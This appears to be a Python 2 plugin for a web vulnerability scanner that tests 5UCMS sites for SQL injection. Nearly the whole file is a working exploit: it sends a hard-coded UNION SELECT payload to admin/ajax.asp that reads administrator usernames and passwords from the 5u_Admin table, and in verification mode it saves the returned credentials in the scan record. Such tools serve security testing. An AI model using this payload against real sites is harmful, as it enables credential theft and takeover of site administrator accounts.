#!/usr/bin/python
# -*- coding: utf-8 -*-
import logging
import re
import urlparse
from lib.common import *

def GetTrueUrl(url):
    try:
        parse=urlparse.urlparse(url)
        urls=parse.path
        if urls=="" or urls=="/":
            return url
        urls=url.split("/")
        urls=urls[len(urls)-1]
        if urls=="" or urls.find(".")<0:
            return  url
        else:
            return False     
    except Exception,e:
        logging.getLogger().error("5ucmssqlinjdecion.gettrueurl Exception(DirectoryTraversal.py):" + str(e))
        return False
def run_url(http,ob,item):
    try:
        result=[]
        
        exp="admin/ajax.asp?Act=modeext&cid=1%20and%201=2%20UNION%20select%20111%26Chr(13)%26Chr(10)%26username%26chr(58)%261%26Chr(13)%26Chr(10)%26password%26chr(58)%20from 5u_Admin&id=1%20and%201=2%20UNION%20select%201%20from 5u_Admin"
        geturl=GetTrueUrl(item['url'])
        if geturl:
            
            getrequesturl="%s%s"%(geturl,exp)
            response,content=requestUrl(http,getrequesturl,ob['task_id'],ob['domain_id'])
            if content.find("True|")>=0:
                detail=u""
                detail=detail.encode('utf8')
                request=getRequest(getrequesturl,'GET')
                response=getResponse(response,"")
                if ob['isstart']=='1':
                    detail="%s\n验证性扫描结果：\n%s"%(detail,content)
                result.append(getRecord(ob,geturl,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("5ucmssqlinjdecion.run_url" + str(e))
        write_scan_log(ob['task_id'],ob['domain_id'],"5ucmssqlinjdecion.run_url " + str(e))
    return result
    
    

